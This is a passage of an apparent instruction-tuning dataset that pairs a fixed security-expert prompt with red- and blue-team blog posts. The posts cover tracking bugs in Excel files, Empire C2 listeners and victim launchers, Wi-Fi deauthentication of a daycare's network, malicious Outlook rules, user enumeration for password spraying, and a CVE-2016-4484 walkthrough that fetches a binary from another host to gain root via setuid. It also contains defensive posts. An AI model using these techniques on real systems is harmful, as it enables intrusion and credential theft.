errors That's the whole point of this hamming error correction code thing after all It turns out that the answer is more matrices This next piece of code acts as a hamming code decoder in three parts We'll break each down individually def syndrome msg passed a list of hamming 8 4 -encoded bits integers 1 or 0 returns an error syndrome for that list msg np.reshape np.array msg -1 8 .T syndrome generation matrix transition np.mat '0 1 1 1 1 0 0 0 1 0 1 1 0 1 0 0 1 1 0 1 0 0 1 0 1 1 1 0 0 0 0 1 result np.dot transition msg mod 2 the matrix multiplication return np.mod result 2 The first task is to calculate a syndrome for this hamming code This error syndrome as it's called is basically a record of what's wrong with the message much like the syndrome of a disease it can tell us what's wrong with the message so we can tell how to apply our error corrections to fix it The mechanics here are the same as the hamming encoding get the array in the right shape multiply with the proper hamming code syndrome matrix then mod everything by 2 def correct msg syndrome passed a syndrome and a message as received presumably with some errors will use the syndrome to correct the message as best possible the syndrome for any incorrect bit will match the column of the syndrome generation matrix that corresponds to the incorrect bit a syndrome of 1 1 0 1 would indicate that the third bit has been flipped since it corresponds to the third column of the matrix syndrome generation matrix copy pasted from above transition np.mat '0 1 1 1 1 0 0 0 1 0 1 1 0 1 0 0 1 1 0 1 0 0 1 0 1 1 1 0 0 0 0 1 for synd in range syndrome.shape 1 if not np.any syndrome synd all zeros no error continue otherwise we have an error syndrome for col in range transition.shape 1 not very pythonic iteration but we need the index if np.array_equal transition col syndrome synd current_val msg synd col new_val current_val 1 2 msg.itemset synd col new_val return msg Once we have a syndrome we know how to correct the message This code above matches each syndrome to the bit that needs to be flipped by comparing each error syndrome to the syndrome generation matrix from above If we find a match we flip the corresponding bit if it doesn't match we use the continue keyword to skip to the next iteration of the loop def decode msg r np.mat '1 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 1 0 0 0 0 res np.dot r msg.T convert to a regular python list which is a pain return res.T.reshape 1 -1 .tolist 0 Now that we've corrected our message we can decode it Using the decoding matrix above we do the same ol matrix multiplication in order to get our final message out So what's the outcome of all this Continuing our image steganography example from part 3 this is the final result Here's our original message with text on the right and the corresponding hex values on the left dnelson blueharvest hamming-stego xxd -s 7 -l 45 output.txt 00000007 7765 2772 6520 676f 696e 6720 746f 2068 we're going to h 00000017 6964 6520 7468 6973 206d 6573 7361 6765 ide this message 00000027 2069 6e20 616e 2069 6d61 6765 21 in an image This is the data after some errors have been inserted into it and it's been padding a little bit dnelson blueharvest hamming-stego xxd -s 70 -l 100 output.txt 00000046 7765 2772 6520 656b 696e 6720 746f 2068 we're eking to h 00000056 6964 6520 7468 6973 206d 6573 7361 6765 ide this message 00000066 2069 6e20 616e 2069 6d61 6765 0100 0400 in an image 00000076 0000 0000 0000 0000 0002 0000 0000 0000 00000086 0000 0000 0000 0000 0000 0000 0000 0000 00000096 0000 0800 0000 0000 0000 1000 0000 0000 000000a6 0000 0000 And this is our final corrected output dnelson blueharvest hamming-stego xxd -s 54765 -l 100 output.txt 0000d5ed 7765 2772 6520 676f 696e 6720 746f 2068 we're going to h 0000d5fd 6964 6520 7468 6973 206d 6573 7361 6765 ide this message 0000d60d 2069 6e20 616e 2069 6d61 6765 2100 0000 in an image 0000d61d 0000 0000 0000 0000 0000 0000 0000 0000 0000d62d 0000 0000 0000 0000 0000 0000 0000 0000 0000d63d 0000 0000 0000 0000 0000 0000 0000 0000 0000d64d 0000 0000 That's it we corrected a message using a hamming code Whereas before we had to repeat each character 9 times this hamming code fits 4 bytes of data into each 8 byte code word a 1 2 ratio of data to total instead of our 1 9 from before A pretty sizable improvement Note however that the error correction capabilities of a hamming code are only so good The damaged message up above is still pretty readable to a human much more than that and errors start to sneak through to the end Maybe that's okay but maybe it's not As always there are tradeoffs Want to see the full image steganography example in action Visit ithub.com DakotaNelson hamming-stego and check it out That link heads straight to Github where you'll find a free steganography tool in Python usable on Linux Mac Windows or anywhere else you can run Python If you'd like a single PDF of this entire four part series you can head over to the Striker Security Blog to download one _____ Dakota runs Striker Security you can find more of his writing at trikersecurity.com blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bugging Microsoft Files: Part 2 - Xlsx Files using Microsoft Excel</title>\n<taxonomies>Author, Ethan Robish, Red Team, Red Team Tools, Bugging Excel files, Bugging xlsx files, Colin Edwards, Excel, Microsoft Excel, microsoft office</taxonomies>\n<creation_date>Mon, 14 Nov 2016 17:56:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish As promised in my previous post part 1 this post shows how to place a tracking bug in a native .xlsx file Full credit for this method goes to Colin Edwards see link at end of post The instructions below were made with Microsoft Excel 2013 for Windows Open an existing document or create a new one Choose the Data Menu Choose From Web Type the address for your tracking bug You should come up with a unique name for this document so when it is opened later you can tell which document it was The address should be similar to OMAIN index.php?id ID type img but you need to replace DOMAIN and ID with your own values Choose Go to load the URL you entered Click the tiny green arrow in the corner This tells Excel what to read from the page In this case the page is blank so we choose the whole thing Choose a cell to insert the data It does not matter where as we will hide the whole sheet later Choose Properties Check the box next to Refresh the data when opening the file This tells Excel to load the tracking bug every time the file is opened Choose OK twice You will see data in the cell you chose To hide this Choose the symbol to add a new sheet Right-click the sheet where your tracking bug is Choose Hide You may want to rename the remaining sheet to something more specific Save the file and close Excel When the spreadsheet is opened Excel will not automatically trigger the tracking bug Instead it will prompt the user with a security message as shown here Choosing Enable Content will trigger the tracking bug Excel will remember this and not ask the next time the same user opens the same document Part 1 Part 3 Reference canthackit.wordpress.com 2016 04 22 web-bugs-in-native-excel-xlsx-files"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Script Startup of Empire Listeners</title>\n<taxonomies>Red Team, Red Team Tools, Carrie Roberts, Empire commands, Empire Listeners, Listeners</taxonomies>\n<creation_date>Fri, 18 Nov 2016 16:00:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Tired of typing those Empire commands to startup your goto listeners Wish there was an equivalent to Metasploit resource files for Empire This is not currently implemented as far as I know so until then here is a hack to make it happen When I'm working with tools on a remote server which is always the case when I'm using Empire I always use the Linux screen tool The biggest reason I use screen is so that my processes such as Empire do not quit if when I get disconnected from the server The solution for scripting the startup of Empire Listeners given here utilizes a feature of screen Some common and useful screen commands can be found in this guide First start a screen session giving it a specific name The following command creates a screen session named my-screen and immediately enters the default window within the screen session screen -S my-screen Each screen session can contain many windows We are currently interacting with the default screen Let's rename this screen window to empire and start Empire in it To rename this screen window use this key combination Ctrl-a A This brings up a prompt at the bottom of the window where you can enter the new name Now let's start Empire in this window I've got empire downloaded to the root Empire directory so I enter the following commands cd root Empire empire We will leave Empire running there and start-up another window within our screen session using the Ctrl-a c key combination From here we create a bash script that uses a feature of Screen allowing us to send commands to particular windows within a session The following is an example script sending commands to start up an Empire listener with specific settings The commands are sent to the screen session named my-screen and the window named empire within that session In my case I named the file above 443 After creating the script I make it executable as follows and then ran it chmod x 443 443 Now switch back to your other screen window where Empire is running with the Ctrl-a space key combination to see the results In the future all we need to do to start up our custom listener is run the 443 script using the 443 command You can create additional scripts for other ports and settings of your choice or combine them all to start up all of your listeners at once Do you have a better easier way to accomplish this task Please share and I'll update this post"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Weaponizing Princess Toys: Crafting Wi-Fi Attack Kits</title>\n<taxonomies>Author, Fun & Games, Jordan Drysdale, Red Team, Wireless, Hand Crafted, hardware hacking, More Fun Projects, Princess Computer, Weaponizing Kids' Toys, Wi-Fi Attack Kits</taxonomies>\n<creation_date>Wed, 16 Nov 2016 16:40:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Alternate Title Why I Love BHIS So I was gifted this cute little princessy-toy thing recently My first thought was that my daughters will love this thing My second thought was let's turn this into a princess play thing reverse SSH Kali hacker backdoor exploit kit with onboard ad-hoc Wi-Fi that I can connect to remotely via a directional Wi-Fi antenna for covert use in wireless and contractual engagements Parts list minus the directional antenna I installed and Configured Kali for pi Link here for RPi kali image Assembled parts I recommend reviewing Wired's Guide to Parenting on Wired Gaffigan's stuff is hilarious BTW Editor's Note We hope you'll notice how much awesome is going on in this photo It was time to make the RPi fit inside the princessy-toy thing I used a standard rotary tool and just started carving I was able to craft a nifty little opening for a power port I dropped in the screw port to keep the RPi in place once the unit is ready for action Boom I got power running of a solar cell Corollary This 10000 mAh cell gave me about 15 hours running time with an ad-hoc Wi-Fi cell an external USB Wi-Fi adapter and Kismet running Anker the cell below is from PowerCell but for actual use in the field I went with the extremely low profile PowerCore mini Amazon 13 bucks Finished product bottom side ANKERofficial And yes you darn right the thing still works In the next step I configured hostapd to broadcast an ad-hoc wireless cell on the RPi for remote connectivity With the directional antenna the theory goes something like this Point the directional antenna at the target Connect the legally and contractually allowed laptop or VM to the ad-hoc cell Run kismet off the USB dongle that Hak5 sells Capture 4 way handshake and let the cracker do the rest This USB dongle works out of the box and has no issues with driver integration on Kali for RPi hostapd configuration on RPi Wlan0 interface for ad-hoc Wi-Fi and the secondary wlan adapter for packet sniffing and injection I sent one of the kids down the street with the new toy Here was the living room rig for some initial testing Now from my really nice mountain ash tree post about twenty feet up I had a bird's eye line of sight with the JoyLive yagi antenna of the daycare where my kids hang out when they get bored of my shenanigans And who knew the little princess toy was ready to audit their home Wi-Fi networks .had they not been previously advised From the perch I have about a block or block and a half shot to the day care I got a pretty decent signal the real problem being the moving target This really happened Wireless info from the laptop Note the super legit Tx-Power with that directional attached 1000mW 1W FTWin I went with the WAN ISP type network configuration a 30 without DHCP services which most of the articles that discussed hostapd included Not bad for connectivity you can see the dropped packets but it was stable enough to connect I launched Kismet remember to launch from directory where you want output files created and linked it with attached USB interface Kismet is fun but the real action is done in airmon-ng and airodump-ng Side Note I tested out a Kismet and Wi-Fi packet sniffing config with this device driving across South Dakota recently I captured less than 25MB of SSID data There are nine towns in the state and we are struggling with the new WAN drops out here Most of the hardware we have at the BHIS offices is still on dial-up and token ring Anyway since there are less people in this whole state than a city block anywhere east of the Mississippi river we've had some wireless adoption delays We're still trying though Anyway I launched and killed Kismet and as usual it leaves behind a 'mon interface...used that with airmon-ng instead and sent off the deauth packets With airmon-ng running in the background I fired up another console and launched airodump-ng with the packet destination Deauth someone at the daycare facility Rock and Roll I snagged a handshake Great Successes Handshake complete hashes off to the Nvidia Grid GPU EC2 instance for further investigations Or for brevity's sake check out my test run against a pre-fab dictionary file Next up looking at a couple different things .but our good friend Delta Charlie has us all talking about remotely controlling modified kids toys via SDR to run surveillance Check out this rig"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Two Button PWNage</title>\n<taxonomies>Blue Team, Red Team, DeepSec16, encryption, enter key, enter sesame, Linux, LUKS</taxonomies>\n<creation_date>Thu, 17 Nov 2016 17:15:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Logan Lembke Step One Power Step Two Enter Step Three Step Four Profit In the security industry we love our encryption However sometimes the complexity introduced by encryption can bite us down the road A serious case of this was announced last Friday November 11th at DeepSec 2016 in Vienna CVE-2016-4484 After powering on most Linux computers with hard drive encryption enabled LUKS you can make your way into a root shell by simply holding down the enter key Alright that sounds bad and it is However the shell you are presented with is severely stripped down and the encrypted disks remain encrypted Thankfully this means a would-be attacker would not be able to access most of the data on the system However the authors of the finding Hector Marco and Ismael Ripoll are quick to point out that the vulnerability is still useful for nefarious activities such as Elevation of privilege Since the boot partition is typically not encrypted It can be used to store an executable file with the bit SetUID enabled Which can later be used to escalate privileges by a local user If the boot is not secured then it would be possible to replace the kernel and the initrd image Information disclosure It is possible to access all the disks Although the system partition is encrypted it can be copied to an external device where it can be later be brute forced Obviously it is possible to access non-encrypted information in other devices Denial of service The attacker can delete the information on all the disks Quoted from marco.org bugs CVE-2016-4484 CVE-2016-4484_cryptsetup_initrd_shell.html How do I fix the issue Sadly this bug occurs in several different code bases making it harder to remedy On Debian based systems this problem exists in the cryptsetup package and on RHEL based systems the problem lies in the dracut package At the time of this writing I have not heard whether or not mkinitcpio based systems are affected On Debian based systems the error is caused by an off by one error in the cryptroot shell script which is packaged with cryptsetup Marco and Ripoll explain the error here link to marco.org bugs CVE-2016-4484 CVE-2016-4484_cryptsetup_initrd_shell.html An official patch has been rolled out to Debian's unstable and testing repositories but the patch has not been pushed through to the stable branch Additionally Ubuntu has yet to push through a patch to any of their repositories While you wait for the official patch you can protect your system running the following script based on the fix suggested by Marco and Ripoll CVE-2016-4484-Debian-Fix bin sh perl -i -lpe if s count 0 print tsuccess 0 if s message cryptsetup crypttarget set up successfully print t tsuccess 1 usr share initramfs-tools scripts local-top cryptroot perl -i -0777 -pe s s if crypttries -gt 0 count -gt crypttries then s message cryptsetup maximum number of tries exceeded for crypttarget s return 1 n tif success -eq 0 then n t tmessage cryptsetup Maximum number of tries exceeded Please reboot n t twhile true do n t t tsleep 100 n t tdone usr share initramfs-tools scripts local-top cryptroot update-initramfs -u Unfortunately I cannot provide a fix for dracut on RHEL based systems Dracut is an event based tool used to generate the initial ram disk used when booting up your Linux system and I am not very familiar with its code base However the fix is likely to be simple but after looking through the code I did not quickly notice how to fix it In the meantime checkout the progress being made on official patches here Debian ackages.qa.debian.org c cryptsetup.html Ubuntu eople.canonical.com ubuntu-security cve 2016 CVE-2016-4484.html RHEL ccess.redhat.com security cve cve-2016-4484 Dracut it.kernel.org cgit boot dracut dracut.git Time to get to work Who cares about a vulnerability which requires physical access While exploiting this vulnerability requires physical access it is still lethal in a virtual environment Imagine an attacker is stalking your hypervisor With this vulnerability the attacker has an easy way to elevate their privileges on an encrypted virtual machine The attacker waits until the virtual machine is powered off jumps into the root shell mounts the unencrypted boot partition loads some programs onto it sets the sticky bit on the programs shuts down the virtual machine and waits until someone logs back into it Now all the attacker has to do is run the programs they loaded into the boot partition in order to obtain root access The commands used to execute this attack would look something like this Drop into the shell using CVE 2016 4484 Mount the boot partition mkdir boot mount dev sda1 boot Set up an ip address to receive executables Note the busybox executables included in the initramfs do not work with the sticky bit ip address add 192.168.0.74 24 ifconfig ens33 up Serve up usr bin on another computer 192.168.0.100 24 Download nano to the boot partition cd boot wget 192.168.0.100 nano Set the sticky bit chmod 4755 nano Shutdown cd umount dev sda1 poweroff Wait and obtain access to an underprivileged account boot nano etc shadow WIN Note This was tested using Ubuntu Server 16.04 Fedora 24 does not seem to be vulnerable to this attack without some finagling since chmod is not included in the dracut shell by default However dracut does include vi by default which should be susceptible to the sticky bit attack How do we prevent these types of vulnerabilities The code in question concerning this vulnerability is all open source There simply weren't enough critical readers reviewing the code As users of these immensely popular projects we owe it to ourselves to occasionally participate in the code review process It wasn't only the contributors to these projects who failed We failed Next time you're using a piece of technology critical to your business or daily habits check if the source code is available for it Skim through it See if you can catch a bit of the ingenuity that went into creating it If you don't understand a lick of code check out the wiki and bug trackers for the projects Too often we take software for granted and we howl when vulnerabilities like this come out of the woodwork Learn more about CVE-2016-4484 at the official disclosure"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bugging Microsoft Files: Part 3  Clearing Metadata</title>\n<taxonomies>Author, Ethan Robish, Red Team, Red Team Tools, author metadata, bugging documents, how to clear metadata, Microsoft, MS Excel, MS Word</taxonomies>\n<creation_date>Mon, 21 Nov 2016 14:41:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish In my last two posts I showed how to insert tracking bugs in both .docx Part 1 and .xlsx files Part 2 But don't let all that effort go to waste by leaving metadata in that could lead back to you When you save a file in Microsoft Office some metadata about you is stored such as the author name Choose the File Info menu and you can see what value is set as the author If it is something generic or purposely misleading you may wish to leave it as-is The instructions below were made with Microsoft Office 2013 for Windows Author Metadata However if you want to clear the data this is how Check for Issues From the File Info menu click Check for Issues Choose Inspect Document Document Inspector Choose Inspect in the dialog window that appears Document Inspector Author Choose Remove All next to Document Properties and Personal Information Document Inspector Headers Scrolling down you may see other items with Remove All buttons next to them Use your discretion on which ones to remove but keep in mind where you stored your tracking bug In this case I put it in the document header so it makes sense that the Document Inspector is showing that there is a header I will choose to leave this there since I know all it contains is the tracking bug Document Inspector Hidden Sheets This is an example from an Excel spreadsheet where the tracking bug is in a hidden sheet This is another place where you would not remove it Once you exit the Document Inspector verify that the author metadata was removed Part 1 Part 2"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Using PowerShell Empire with a Trusted Certificate</title>\n<taxonomies>External/Internal, Red Team, Carrie Roberts, Let's Encrypt, PowerShell, PowerShell Empire, Trusted Certificate</taxonomies>\n<creation_date>Wed, 23 Nov 2016 14:46:07 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Using a trusted certificate and non-default Empire options will help increase your chances of getting a successful session out of a network Follow these instructions to get setup First get a signed digital certificate for your server using Let's Encrypt Visit ertbot.eff.org for instructions The process is also shown here for Apache running on Debian First select your server software and Operating system in this case Apache and Debian 8 Certbot Start Page Add the Jessie Backports Repo to your sources.list file etc apt sources.list in this case by adding the following line deb tp.debian.org debian jessie-backports main Then update with this command sudo apt-get update Install the Certbot package sudo apt-get install python-certbot-apache -t jessie-backports Run the apache plugin sudo certbot --apache This will prompt you to answer some questions Note that you will be required to have a domain name pointing to your server they are cheap just buy one because Let's Encrypt will not issue certificates for bare IP addresses Alternatively you could use a self-signed certificate as described here ttackerkb.com Powershell Powershell_Empire which would not require a domain name Successful Setup via Let's Encrypt Now combine your cert.pem and privkey.pem into the same file for use with Empire Thanks Joff cd etc letsencrypt live cp privkey.pem empire-priv.key cat cert.pem chain.pem empire-chain.pem Stop Apache so that ports 80 and 443 are available for your Empire listener service apache2 stop Within Empire use options similar to the following Note that changing the jitter and default profile is in an attempt to avoid detection of the session and increase chances that you will get a successful session Thanks Derek uselistener http set Name 443 set Port 443 set DefaultJitter 0.7 set CertPath etc letsencrypt live set Host https set DefaultProfile admin login.php console dashboard.asp news today.jsp Mozilla 5.0 Windows NT 6.1 WOW64 Trident 7.0 execute Note For hints on scripting the startup of your listener see here ww.blackhillsinfosec.com how-to-script-startup-of-empire-listeners You now have an HTTPS listener on port 443 You can generate a PowerShell command to run on the victim to establish a session with the following Empire commands back usestager multi launcher 443 execute Using the Empire Launcher Copy and paste the big long PowerShell command into cmd.exe on your victim to establish the session over HTTPS with a trusted certificate Woot Woot ____ Shout out to Joff Thyer and Derek Banks for the ideas and help in getting it going"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Increase the Minimum Character Password Length (15+) Policies in Active Directory</title>\n<taxonomies>Author, Blue Team, Kent Ickler, Jordan Drysdale, long passwords, Password Security Objects, passwords, Windows 95/96, Windows Admin</taxonomies>\n<creation_date>Mon, 28 Nov 2016 16:54:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler As a start to a series on Windows Administration in the eyes of a security-conscious Windows Guy I invite you on configuring AD DS PSOs Password Security Objects and how they can be implemented in your environment to enforce acceptable password restrictions beyond what native AD GPO supports The Arbitrary A drive for longer passwords About the time you've finished reviewing your SOX-DSS-HIPAA-Omnibus-PCI-CJIS-FBI-CIA-BYOBeer audit findings your empathic auditor reveals the progressive requirement of a 15 character minimum password Possibly because last year's policy change and enforcement of a 14 character minimum password was too much fun to not be an annual experience you know a headache will soon ensue As the Active Directory Admin you are about to learn the crux of backwards-compatibility and how it is limiting today's security platforms Backwards Compatibility Limits Security History Lesson for the Post-Millennials Back in Windows 95 98 days passwords were stored using the LM Hash The LM hash method was secure in its day a password would be same-cased padded to 14 characters broken into two 7 character halves and each half is used to encrypt a static string The resulting two encryptions are put together forming the LM Hash stored password Arguably LM Hash and cryptographic functions in yesteryear were sufficient mechanisms to store a password and data without the threat of a timely brute-force compromise Today a lean built hashcat system will brute force 100 LM hashes in just a few moments While Microsoft systems eventually retired the LM Hash for more secure yet still compromisable hash functions the backwards compatible cryptography remained for years following NT4 leading systems into the new millennium with password vulnerabilities and limiting acceptable Group-Policy configurations Native Active Directory group-policy password settings still haven't graduated from the 14 character stigma this is most relevant when attempting to set a 15 character minimum password Group Policy Limitation Fear not die-hard Windows 2012 GUI loving admins Active Directory can natively support 15 minimum character passwords all from the GUI and without headaches Windows 2008 AD DS introduced Fined Grained Password Policies or Password Setting Object PSO PSOs instead of using a computer-object Group Policy targeted specific Active Directory user accounts or user groups However creating a PSO in Windows 2008 was still reserved for ADSI editors and PowerShell ninjas See more information at bottom In Windows 2012 the feature moved from the back-end Active Directory management and into a front-end GUI buried within the seldom used Active Directory Administration Center More importantly though in our hunt to overcome password character limitation requirements PSOs allow for a maximum value of the minimum password character length 255 characters effectively preventing password changes PSOs in Windows 2012 Setting up PSO's within Windows 2012 is easy and won't affect users until they attempt their next password change Buyer beware and always test your work however see caveats at bottom Control Panel System and Security Administrative Tools Advice Directory Administrative Center DomainName System Password Settings Container Right Click New Password Settings Complete the PSO settings and assign a User or User Group target To assign the policy to all users use Domain Users Notice in this test we have specified 20 characters to be the minimum length for acceptable passwords Testing your work Changing password with a new 15 character password Test your work Changing password with a new 20 character password Caveats and Considerations There are a couple of serious considerations that should be made when using a PSO to configure a password requirement On Administration and troubleshooting PSO's don't lend themselves nicely in an RSOP so be sure your administrators know to check for PSOs if your support desk is hearing about password-change headaches Know that because the PSO is targeting domain user accounts instead of domain computer accounts workstation server local user accounts will not be affected nor will domain computer accounts be affected It is important therefore to operate both the typical Active Directory Group Policy as well as the PSO to limit acceptable passwords There are other alternatives to using a PSO to set the password policy to limit acceptable passwords There are HKLM reg-hacks that will force submissive systems to specific password lengths There is also a decade's old solution of building a custom password filter library and registering it in the system Regarding backwards compatibility LM Hashing there are solutions within Group Policy and HKLM for that too As Microsoft slowly closes the backward-compatibility security gap we may eventually find that the Password Policies within native AD DS Group Policies will begin to catch up to the security standards of today and forcing a 7 14 15 255 500 character minimum password that will be no headache at all Or we'll all just be chiseling stone tablets On a last note be sure to buy your internal auditors and pen-testers breakfast More Information Creating a PSO in Windows 2008 echnet.microsoft.com en-us library cc754461 v ws.10 .aspx LM Hash information echnet.microsoft.com en-us library hh994558 v ws.10 .aspx Preventing the use of LanMan Hash upport.microsoft.com en-us kb 299656"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Malicious Outlook Rules in Action</title>\n<taxonomies>External/Internal, How-To, Red Team, Outlook</taxonomies>\n<creation_date>Tue, 29 Nov 2016 15:01:04 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Getting a shell using a malicious Outlook rule is an awesome tool during a pentest and great fun Nick Landers had a great post including enough information to make this happen Although it left a few things for the reader to figure out and there was one gotcha In this post I provide some additional information to help you get this going First the Gotcha You need to use Python3 to run the rulz.py script Otherwise you get an error similar to that shown below Rulz.py Error When Run with Python 2.x Second details for setting up a WebDAV server The original SilentBreak Security blog post gave minimal details for setting up your WebDAV server so I provided detailed instructions here I suggest using a read-only WebDAV server so your payloads don't get maliciously overwritten When you run rulz.py give it a local filename to save the rule to instead of the location on your WebDAV server I also provide expanded information on setting up your Empire listener here to improve your chances of success Third be sure to close your local instance of Outlook before sending an email to the target so that the payload executes on their machine and not yours Fourth Shellz Additional References Getting Outlook Credentials ww.blackhillsinfosec.com ?p 4694 ww.blackhillsinfosec.com ?p 5330 More on Malicious Rules abs.mwrinfosecurity.com blog malicous-outlook-rules ______ For tips on getting a shell through a malicious outlook rule without using an EXE file see this related post"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Domain Password Audit Tool</title>\n<taxonomies>Blue Team, Blue Team Tools, Red Team, Red Team Tools, Domain Password Audit Tool, DPAT</taxonomies>\n<creation_date>Thu, 01 Dec 2016 17:50:51 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts A tool to generate password usage statics in a Windows domain based on hashes dumped from a domain controller The Domain Password Audit Tool DPAT is a python script that analyzes the hash information in combination with a list of cracked passwords output from a tool such as oclHashcat The script generates an interactive HTML report containing complete details to help you understand password use in an environment and identify issues An option to generate a sanitized version of the report is also included Example Summary Page of DPAT Report Complete usage instructions and code are available on GitHub here ithub.com clr2of8 DPAT _____ Want to see a demo of this in action Check out Carrie's webcast demo here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Domain User Enumeration</title>\n<taxonomies>Red Team, Red Team Tools, password spraying, powershell domain user enumeration, tools</taxonomies>\n<creation_date>Wed, 07 Dec 2016 14:54:13 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Chevy Swanson Everyone loves being able to speed up their work with custom tools but the clear problem is that computers are a bit too fussy about everything being perfect and exact One very specific place where this problem comes up is when working with users on a domain No matter how you try to get a list of users it's going to be packaged with all sorts of small things like inconsistent spacing and visual details that offer no real value This isn't a real problem because we are just fine distinguishing between the fluff and the real data we need While I am sure that there is a startup somewhere that is probably boasting how easy it is to get their AI to do the same I doubt that you want to create Skynet every time you need to parse the output of a command The best example of where a username list is useful is in this simple password spraying attack All it needs is a small list of common passwords and a list of domain users This stops being so simple when you have a lot more users than you want to make a list for Simply put when faced with hundreds or thousands of users in a domain it's not usually the best idea to manually add them to a list so you can run this attack With two commands one if you want to just combine them into one nice script you can sit back and let people's bad judgement in passwords do your work for you Relaxing A few commands and one liners for generating the username list that seemed to work at first would break or become useless at higher numbers of users on the domain To address these problems I wrote up a short script that simply takes the output of net users domain and puts the usernames into a text file one name per line We have had a lot of success using this script in situations where we have had to parse thousands of names and it holds up fine and gets through it fast Feel free to use it to save you a few minutes sometime in the future ithub.com duckingtoniii Powershell-Domain-User-Enumeration"
    },
    {
        "input": "",
